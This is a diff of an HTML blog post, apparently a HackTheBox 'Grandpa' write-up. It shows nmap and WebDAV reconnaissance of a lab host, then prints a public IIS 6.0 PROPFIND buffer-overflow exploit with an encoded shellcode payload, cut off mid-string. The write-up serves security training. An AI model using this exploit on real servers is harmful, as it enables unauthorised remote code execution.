@@ -1,0 +1,876 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Grandpa | Recon kali@kali:~$ nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.10.10.14 Nmap scan report for 10.10.10.14 Host is up, received...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Grandpa</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-09-28 15:38:00+01:00">Mon 28 September 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Grandpa.html">Grandpa</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Grandpa.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <h1 id="recon">Recon</h1>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> nmap -vv --reason -Pn -A --osscan-guess --version-all -p- <span class="m">10</span>.10.10.14
+<span class="go">Nmap scan report for 10.10.10.14</span>
+<span class="go">Host is up, received user-set (0.090s latency).</span>
+<span class="go">Scanned at 2020-09-28 14:17:38 BST for 256s</span>
+<span class="go">Not shown: 65534 filtered ports</span>
+<span class="go">Reason: 65534 no-responses</span>
+<span class="go">PORT   STATE SERVICE REASON  VERSION</span>
+<span class="go">80/tcp open  http    syn-ack Microsoft IIS httpd 6.0</span>
+<span class="go">| http-methods: </span>
+<span class="go">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span>
+<span class="go">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span>
+<span class="go">|_http-server-header: Microsoft-IIS/6.0</span>
+<span class="go">|_http-title: Under Construction</span>
+<span class="go">| http-webdav-scan: </span>
+<span class="go">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span>
+<span class="go">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span>
+<span class="go">|   Server Date: Mon, 28 Sep 2020 13:26:10 GMT</span>
+<span class="go">|   WebDAV type: Unknown</span>
+<span class="go">|_  Server Type: Microsoft-IIS/6.0</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Read data files from: /usr/bin/../share/nmap</span>
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="gp">#</span> Nmap <span class="k">done</span> at Mon Sep <span class="m">28</span> <span class="m">14</span>:21:54 <span class="m">2020</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">256</span>.26 seconds
+</pre></div>
+
+
+<p>Seems like we are dealing with an IIS 6.0 server and WebDAV is enabled. Now, I'll run a deeper scan on port 80:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> nmap -vv --reason -Pn -sV -p <span class="m">80</span> <span class="s2">&quot;--script=banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot;</span> <span class="m">10</span>.10.10.14
+<span class="go">Nmap scan report for 10.10.10.14                                                                      </span>
+<span class="go">Host is up, received user-set (0.079s latency).</span>
+<span class="go">Scanned at 2020-09-28 14:18:00 BST for 303s</span>
+
+<span class="go">PORT   STATE SERVICE REASON  VERSION                                                                                                                                                                 [56/296]</span>
+<span class="go">80/tcp open  http    syn-ack Microsoft IIS httpd 6.0                                                  </span>
+<span class="go">|_http-chrono: Request times for /; avg: 246.14ms; min: 205.54ms; max: 259.71ms                       </span>
+<span class="go">| http-comments-displayer:                                                                                                                                                                                   </span>
+<span class="go">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.10.14                           </span>
+<span class="go">|                                                                                                     </span>
+<span class="go">|     Path: http://10.10.10.14:80/                                                                    </span>
+<span class="go">|     Line number: 20                                                                                 </span>
+<span class="go">|     Comment:                                                                                                                                                                                               </span>
+<span class="go">|         &lt;!--Probable causes:&lt;--&gt;</span>
+<span class="go">|                                      </span>
+<span class="go">|     Path: http://10.10.10.14:80/</span>
+<span class="go">|     Line number: 18                                                                                                                                                                                        </span>
+<span class="go">|     Comment:                                                                                        </span>
+<span class="go">|_        &lt;!--Problem--&gt;                                                                              </span>
+<span class="go">|_http-csrf: Couldn&#39;t find any CSRF vulnerabilities.                                                  </span>
+<span class="go">|_http-date: Mon, 28 Sep 2020 13:22:28 GMT; +4m17s from local time.                         </span>
+<span class="go">|_http-devframework: ASP.NET detected. Found related header.                                          </span>
+<span class="go">|_http-dombased-xss: Couldn&#39;t find any DOM based XSS.                                        </span>
+<span class="go">|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=&lt;number|all&gt; for deeper analysis)                                                                                   </span>
+<span class="go">| http-enum:                                                                                          </span>
+<span class="go">|   /postinfo.html: Frontpage file or folder</span>
+<span class="go">|   /_vti_bin/_vti_aut/author.dll: Frontpage file or folder                                                                                                                                                  </span>
+<span class="go">|   /_vti_bin/_vti_aut/author.exe: Frontpage file or folder            </span>
+<span class="go">|   /_vti_bin/_vti_adm/admin.dll: Frontpage file or folder                                                                                                                                                   </span>
+<span class="go">|   /_vti_bin/_vti_adm/admin.exe: Frontpage file or folder                                            </span>
+<span class="go">|   /_vti_bin/fpcount.exe?Page=default.asp|Image=3: Frontpage file or folder                          </span>
+<span class="go">|   /_vti_bin/shtml.dll: Frontpage file or folder</span>
+<span class="go">|_  /_vti_bin/shtml.exe: Frontpage file or folder                                                     </span>
+<span class="go">|_http-errors: Couldn&#39;t find any error pages.</span>
+<span class="go">|_http-feed: Couldn&#39;t find any feeds.                                                                 </span>
+<span class="go">|_http-fetch: Please enter the complete path of the directory to save data in.</span>
+<span class="go">| http-frontpage-login:                                                                               </span>
+<span class="go">|   VULNERABLE:                                                                                       </span>
+<span class="go">|   Frontpage extension anonymous login                                                               </span>
+<span class="go">|     State: VULNERABLE                                                                               </span>
+<span class="go">|       Default installations of older versions of frontpage extensions allow anonymous logins which can lead to server compromise.                                                                          </span>
+<span class="go">|                                                                                                     </span>
+<span class="go">|     References:                                                                                     </span>
+<span class="go">|_      http://insecure.org/sploits/Microsoft.frontpage.insecurities.html</span>
+<span class="go">| http-headers:                                                                                       </span>
+<span class="go">|   Content-Length: 1433                                                                              </span>
+<span class="go">|   Content-Type: text/html                 </span>
+<span class="go">|   Content-Location: http://10.10.10.14/iisstart.htm                      </span>
+<span class="go">|   Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT                                                                                                                                                             </span>
+<span class="go">|   Accept-Ranges: bytes                                                                                                                                                                                     </span>
+<span class="go">|   ETag: &quot;05b3daec0d9c21:2c3&quot;                                                                        </span>
+<span class="go">|   Server: Microsoft-IIS/6.0                                                                         </span>
+<span class="go">|   MicrosoftOfficeWebServer: 5.0_Pub         </span>
+<span class="go">|   X-Powered-By: ASP.NET                                                                             </span>
+<span class="go">|   Date: Mon, 28 Sep 2020 13:22:27 GMT                                                                                                                                                                      </span>
+<span class="go">|   Connection: close                                                                                                                                                                                        </span>
+<span class="go">|                                                                                                     </span>
+<span class="go">|_  (Request type: HEAD)                       </span>
+<span class="go">|_http-iis-webdav-vuln: WebDAV is ENABLED. No protected folder found; check not run. If you know a protected folder, add --script-args=webdavfolder=&lt;path&gt;                                                   </span>
+<span class="go">|_http-jsonp-detection: Couldn&#39;t find any JSONP endpoints.                                            </span>
+<span class="go">|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable                                                                                           </span>
+<span class="go">|_http-malware-host: Host appears to be clean</span>
+<span class="go">| http-methods: </span>
+<span class="go">|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH</span>
+<span class="go">|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH</span>
+<span class="go">|_http-mobileversion-checker: No mobile version detected.</span>
+<span class="go">| http-php-version: Logo query returned unknown hash d36ef6356fa2aa546f1da2bb003c17b1</span>
+<span class="go">|_Credits query returned unknown hash d36ef6356fa2aa546f1da2bb003c17b1</span>
+<span class="go">|_http-referer-checker: Couldn&#39;t find any cross-domain scripts.</span>
+<span class="go">|_http-security-headers: </span>
+<span class="go">|_http-server-header: Microsoft-IIS/6.0</span>
+<span class="go">| http-sitemap-generator: </span>
+<span class="go">|   Directory structure:</span>
+<span class="go">|     /</span>
+<span class="go">|       Other: 1; gif: 1</span>
+<span class="go">|   Longest directory structure:</span>
+<span class="go">|     Depth: 0</span>
+<span class="go">|     Dir: /</span>
+<span class="go">|   Total files found (by extension):</span>
+<span class="go">|_    Other: 1; gif: 1</span>
+<span class="go">|_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities.</span>
+<span class="go">|_http-title: Under Construction</span>
+<span class="go">| http-useragent-tester: </span>
+<span class="go">|   Status for browser useragent: 200</span>
+<span class="go">|   Allowed User Agents: </span>
+<span class="go">|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)</span>
+<span class="go">|     libwww</span>
+<span class="go">|     lwp-trivial</span>
+<span class="go">|     libcurl-agent/1.0</span>
+<span class="go">|     PHP/</span>
+<span class="go">|     Python-urllib/2.5</span>
+<span class="go">|     GT::WWW</span>
+<span class="go">|     Snoopy</span>
+<span class="go">|     MFC_Tear_Sample</span>
+<span class="go">|     HTTP::Lite</span>
+<span class="go">|     PHPCrawl</span>
+<span class="go">|     URI::Fetch</span>
+<span class="go">|     Zend_Http_Client</span>
+<span class="go">|     http client</span>
+<span class="go">|     PECL::HTTP</span>
+<span class="go">|     Wget/1.13.4 (linux-gnu)</span>
+<span class="go">|_    WWW-Mechanize/1.34</span>
+<span class="go">| http-vhosts: </span>
+<span class="go">|_127 names had status 200</span>
+<span class="go">| http-webdav-scan: </span>
+<span class="go">|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH</span>
+<span class="go">|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK</span>
+<span class="go">|   Server Date: Mon, 28 Sep 2020 13:22:24 GMT</span>
+<span class="go">|   WebDAV type: Unknown</span>
+<span class="go">|_  Server Type: Microsoft-IIS/6.0</span>
+<span class="go">|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=&lt;number|all&gt; for deeper analysis)</span>
+<span class="go">|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&#39;t find wp-login.php</span>
+<span class="go">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Read data files from: /usr/bin/../share/nmap</span>
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="gp">#</span> Nmap <span class="k">done</span> at Mon Sep <span class="m">28</span> <span class="m">14</span>:23:03 <span class="m">2020</span> -- <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in <span class="m">303</span>.69 seconds
+</pre></div>
+
+
+<p>From the above scans few things stood out:</p>
+<ol>
+<li>we have IIS 6.0</li>
+<li>FrontPage is running on the web server and Frontpage extension anonymous login has been found vulnerable.</li>
+<li>ASP.NET detected</li>
+<li>WebDAV is enabled</li>
+<li>
+<p>the default web page shows a page under construction:</p>
+<p><img alt="" src="../images/grandpa-default-webpage.png"></p>
+</li>
+</ol>
+<p>Since webdav is enabled and allows anonymous login we can run a test to check if we can upload any files:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~$</span> davtest -url http://10.10.10.14
+<span class="go">********************************************************</span>
+<span class="go"> Testing DAV connection</span>
+<span class="go">OPEN            SUCCEED:                http://10.10.10.14</span>
+<span class="go">********************************************************</span>
+<span class="go">NOTE    Random string for this session: nwktgQcHGOD2vz5</span>
+<span class="go">********************************************************</span>
+<span class="go"> Creating directory</span>
+<span class="go">MKCOL           FAIL</span>
+<span class="go">********************************************************</span>
+<span class="go"> Sending test files</span>
+<span class="go">PUT     shtml   FAIL</span>
+<span class="go">PUT     jhtml   FAIL</span>
+<span class="go">PUT     cfm     FAIL</span>
+<span class="go">PUT     pl      FAIL</span>
+<span class="go">PUT     cgi     FAIL</span>
+<span class="go">PUT     asp     FAIL</span>
+<span class="go">PUT     html    FAIL</span>
+<span class="go">PUT     aspx    FAIL</span>
+<span class="go">PUT     jsp     FAIL</span>
+<span class="go">PUT     txt     FAIL</span>
+<span class="go">PUT     php     FAIL</span>
+
+<span class="go">********************************************************</span>
+<span class="go">/usr/bin/davtest Summary:</span>
+</pre></div>
+
+
+<p>We can't upload any files so let's use <code>searchsploit</code> to look for potential exploits:</p>
+<div class="highlight"><pre><span></span><span class="gp">kali@kali:~/Documents/HTB/boxes/results/10.10.10.14/scans$</span> searchsploit iis <span class="m">6</span> <span class="p">|</span>grep -i webdav
+<span class="go">Microsoft IIS - WebDAV Write Access Code Execution (Metasploit)     | windows/remote/16471.rb</span>
+<span class="go">Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV &#39;ntdll.dll&#39; Rem | windows/remote/22365.pl</span>
+<span class="go">Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV &#39;ntdll.dll&#39; Rem | windows/remote/22366.c</span>
+<span class="go">Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV &#39;ntdll.dll&#39; Rem | windows/remote/22367.txt</span>
+<span class="go">Microsoft IIS 5.0 (Windows XP/2000/NT 4.0) - WebDAV &#39;ntdll.dll&#39; Rem | windows/remote/22368.txt</span>
+<span class="go">Microsoft IIS 5.0 - WebDAV &#39;ntdll.dll&#39; Path Overflow (MS03-007) (Me | windows/remote/16470.rb</span>
+<span class="go">Microsoft IIS 5.0 - WebDAV Denial of Service                        | windows/dos/20664.pl</span>
+<span class="go">Microsoft IIS 5.0 - WebDAV PROPFIND / SEARCH Method Denial of Servi | windows/dos/22670.c</span>
+<span class="go">Microsoft IIS 5.1 - WebDAV HTTP Request Source Code Disclosure      | windows/remote/26230.txt</span>
+<span class="go">Microsoft IIS 6.0 - WebDAV &#39;ScStoragePathFromUrl&#39; Remote Buffer Ove | windows/remote/41738.py</span>
+<span class="go">Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)         | windows/remote/8704.txt</span>
+<span class="go">Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)         | windows/remote/8806.pl</span>
+<span class="go">Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)     | windows/remote/8754.patch</span>
+<span class="go">Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (PHP)       | windows/remote/8765.php</span>
+</pre></div>
+
+
+<p>From the above list the following seems interesting since it's a remote exploit and could give us remote code execution:</p>
+<div class="highlight"><pre><span></span><span class="go">Microsoft IIS 6.0 - WebDAV &#39;ScStoragePathFromUrl&#39; Remote Buffer Ove | windows/remote/41738.py</span>
+</pre></div>
+
+
+<p>The exploit looks like this:</p>
+<div class="highlight"><pre><span></span><span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">Description:Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2 allows remote attackers to execute arbitrary code via a long header beginning with &quot;If: &lt;http://&quot; in a PROPFIND request, as exploited in the wild in July or August 2016.</span>
+
+<span class="sd">Additional Information: the ScStoragePathFromUrl function is called twice</span>
+<span class="sd">Vulnerability Type: Buffer overflow</span>
+<span class="sd">Vendor of Product: Microsoft</span>
+<span class="sd">Affected Product Code Base: Windows Server 2003 R2</span>
+<span class="sd">Affected Component: ScStoragePathFromUrl</span>
+<span class="sd">Attack Type: Remote</span>
+<span class="sd">Impact Code execution: true</span>
+<span class="sd">Attack Vectors: crafted PROPFIND data</span>
+
+<span class="sd">Has vendor confirmed or acknowledged the vulnerability?:true</span>
+
+<span class="sd">Discoverer:Zhiniang Peng and Chen Wu.</span>
+<span class="sd">Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="c1">#------------Our payload set up a ROP chain by using the overflow 3 times. It will launch a calc.exe which shows the bug is really dangerous.</span>
+<span class="c1">#written by Zhiniang Peng and Chen Wu. Information Security Lab &amp; School of Computer Science &amp; Engineering, South China University of Technology Guangzhou, China </span>
+<span class="c1">#-----------Email: edwardz@foxmail.com</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>  
+
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>  
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">80</span><span class="p">))</span>  
+
+<span class="n">pay</span><span class="o">=</span><span class="s1">&#39;PROPFIND / HTTP/1.1</span><span class="se">\r\n</span><span class="s1">Host: localhost</span><span class="se">\r\n</span><span class="s1">Content-Length: 0</span><span class="se">\r\n</span><span class="s1">&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;If: &lt;http://localhost/aaaaaaa&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\xe6\xbd\xa8\xe7\xa1\xa3\xe7\x9d\xa1\xe7\x84\xb3\xe6\xa4\xb6\xe4\x9d\xb2\xe7\xa8\xb9\xe4\xad\xb7\xe4\xbd\xb0\xe7\x95\x93\xe7\xa9\x8f\xe4\xa1\xa8\xe5\x99\xa3\xe6\xb5\x94\xe6\xa1\x85\xe3\xa5\x93\xe5\x81\xac\xe5\x95\xa7\xe6\x9d\xa3\xe3\x8d\xa4\xe4\x98\xb0\xe7\xa1\x85\xe6\xa5\x92\xe5\x90\xb1\xe4\xb1\x98\xe6\xa9\x91\xe7\x89\x81\xe4\x88\xb1\xe7\x80\xb5\xe5\xa1\x90\xe3\x99\xa4\xe6\xb1\x87\xe3\x94\xb9\xe5\x91\xaa\xe5\x80\xb4\xe5\x91\x83\xe7\x9d\x92\xe5\x81\xa1\xe3\x88\xb2\xe6\xb5\x8b\xe6\xb0\xb4\xe3\x89\x87\xe6\x89\x81\xe3\x9d\x8d\xe5\x85\xa1\xe5\xa1\xa2\xe4\x9d\xb3\xe5\x89\x90\xe3\x99\xb0\xe7\x95\x84\xe6\xa1\xaa\xe3\x8d\xb4\xe4\xb9\x8a\xe7\xa1\xab\xe4\xa5\xb6\xe4\xb9\xb3\xe4\xb1\xaa\xe5\x9d\xba\xe6\xbd\xb1\xe5\xa1\x8a\xe3\x88\xb0\xe3\x9d\xae\xe4\xad\x89\xe5\x89\x8d\xe4\xa1\xa3\xe6\xbd\x8c\xe7\x95\x96\xe7\x95\xb5\xe6\x99\xaf\xe7\x99\xa8\xe4\x91\x8d\xe5\x81\xb0\xe7\xa8\xb6\xe6\x89\x8b\xe6\x95\x97\xe7\x95\x90\xe6\xa9\xb2\xe7\xa9\xab\xe7\x9d\xa2\xe7\x99\x98\xe6\x89\x88\xe6\x94\xb1\xe3\x81\x94\xe6\xb1\xb9\xe5\x81\x8a\xe5\x91\xa2\xe5\x80\xb3\xe3\x95\xb7\xe6\xa9\xb7\xe4\x85\x84\xe3\x8c\xb4\xe6\x91\xb6\xe4\xb5\x86\xe5\x99\x94\xe4\x9d\xac\xe6\x95\x83\xe7\x98\xb2\xe7\x89\xb8\xe5\x9d\xa9\xe4\x8c\xb8\xe6\x89\xb2\xe5\xa8\xb0\xe5\xa4\xb8\xe5\x91\x88\xc8\x82\xc8\x82\xe1\x8b\x80\xe6\xa0\x83\xe6\xb1\x84\xe5\x89\x96\xe4\xac\xb7\xe6\xb1\xad\xe4\xbd\x98\xe5\xa1\x9a\xe7\xa5\x90\xe4\xa5\xaa\xe5\xa1\x8f\xe4\xa9\x92\xe4\x85\x90\xe6\x99\x8d\xe1\x8f\x80\xe6\xa0\x83\xe4\xa0\xb4\xe6\x94\xb1\xe6\xbd\x83\xe6\xb9\xa6\xe7\x91\x81\xe4\x8d\xac\xe1\x8f\x80\xe6\xa0\x83\xe5\x8d\x83\xe6\xa9\x81\xe7\x81\x92\xe3\x8c\xb0\xe5\xa1\xa6\xe4\x89\x8c\xe7\x81\x8b\xe6\x8d\x86\xe5\x85\xb3\xe7\xa5\x81\xe7\xa9\x90\xe4\xa9\xac</span><span class="s1">&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;&gt;&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39; (Not &lt;locktoken:write1&gt;) &lt;http://localhost/bbbbbbb&#39;</span>
+<span class="n">pay</span><span class="o">+=</span><span class="s1">&#39;</span><span class="se">\xe7\xa5\x88\xe6\x85\xb5\xe4\xbd\x83\xe6\xbd\xa7\xe6\xad\xaf\xe4\xa1\x85\xe3\x99\x86\xe6\x9d\xb5\xe4\x90\xb3\xe3\xa1\xb1\xe5\x9d\xa5\xe5\xa9\xa2\xe5\x90\xb5\xe5\x99\xa1\xe6\xa5\x92\xe6\xa9\x93\xe5\x85\x97\xe3\xa1\x8e\xe5\xa5\x88\xe6\x8d\x95\xe4\xa5\xb1\xe4\x8d\xa4\xe6\x91\xb2\xe3\x91\xa8\xe4\x9d\x98\xe7\x85\xb9\xe3\x8d\xab\xe6\xad\x95\xe6\xb5\x88\xe5\x81\x8f\xe7\xa9\x86\xe3\x91\xb1\xe6\xbd\x94\xe7\x91\x83\xe5\xa5\x96\xe6\xbd\xaf\xe7\x8d\x81\xe3\x91\x97\xe6\x85\xa8\xe7\xa9\xb2\xe3\x9d\x85\xe4\xb5\x89\xe5\x9d\x8e\xe5\x91\x88\xe4\xb0\xb8\xe3\x99\xba\xe3\x95\xb2\xe6\x89\xa6\xe6\xb9\x83\xe4\xa1\xad\xe3\x95\x88\xe6\x85\xb7\xe4\xb5\x9a\xe6\x85\xb4\xe4\x84\xb3\xe4\x8d\xa5\xe5\x89\xb2\xe6\xb5\xa9\xe3\x99\xb1\xe4\xb9\xa4\xe6\xb8\xb9\xe6\x8d\x93\xe6\xad\xa4\xe5\x85\x86\xe4\xbc\xb0\xe7\xa1\xaf\xe7\x89\x93\xe6\x9d\x90\xe4\x95\x93\xe7\xa9\xa3\xe7\x84\xb9\xe4\xbd\x93\xe4\x91\x96\xe6\xbc\xb6\xe7\x8d\xb9\xe6\xa1\xb7\xe7\xa9\x96\xe6\x85\x8a\xe3\xa5\x85\xe3\x98\xb9\xe6\xb0\xb9\xe4\x94\xb1\xe3\x91\xb2\xe5\x8d\xa5\xe5\xa1\x8a\xe4\x91\x8e\xe7\xa9\x84\xe6\xb0\xb5\xe5\xa9\x96\xe6\x89\x81\xe6\xb9\xb2\xe6\x98\xb1\xe5\xa5\x99\xe5\x90\xb3\xe3\x85\x82\xe5\xa1\xa5\xe5\xa5\x81\xe7\x85\x90\xe3\x80\xb6\xe5\x9d\xb7\xe4\x91\x97\xe5\x8d\xa1\xe1\x8f\x80\xe6\xa0\x83\xe6\xb9\x8f\xe6\xa0\x80\xe6\xb9\x8f\xe6\xa0\x80\xe4\x89\x87\xe7\x99\xaa\xe1\x8f\x80\xe6\xa0\x83\xe4\x89\x97\xe4\xbd\xb4\xe5\xa5\x87\xe5\x88\xb4\xe4\xad\xa6\xe4\xad\x82\xe7\x91\xa4\xe7\xa1\xaf\xe6\x82\x82\xe6\xa0\x81\xe5\x84\xb5\xe7\x89\xba\xe7\x91\xba\xe4\xb5\x87\xe4\x91\x99\xe5\x9d\x97\xeb\x84\x93\xe6\xa0\x80\xe3\x85\xb6\xe6\xb9\xaf\xe2\x93\xa3\xe6\xa0\x81\xe1\x91\xa0\xe6\xa0\x83\xcc\x80\xe7\xbf\xbe\xef\xbf\xbf\xef\xbf\xbf\xe1\x8f\x80\xe6\xa0\x83\xd1\xae\xe6\xa0\x83\xe7\x85\xae\xe7\x91\xb0\xe1\x90\xb4\xe6\xa0\x83\xe2\xa7\xa7\xe6\xa0\x81\xe9\x8e\x91\xe6\xa0\x80\xe3\xa4\xb1\xe6\x99\xae\xe4\xa5\x95\xe3\x81\x92\xe5\x91\xab\xe7\x99\xab\xe7\x89\x8a\xe7\xa5\xa1\xe1\x90\x9c\xe6\xa0\x83\xe6\xb8\x85\xe6\xa0\x80\xe7\x9c\xb2\xe7\xa5\xa8\xe4\xb5\xa9\xe3\x99\xac\xe4\x91\xa8\xe4\xb5\xb0\xe8\x89\x86\xe6\xa0\x80\xe4\xa1\xb7\xe3\x89\x93\xe1\xb6\xaa\xe6\xa0\x82\xe6\xbd\xaa\xe4\x8c\xb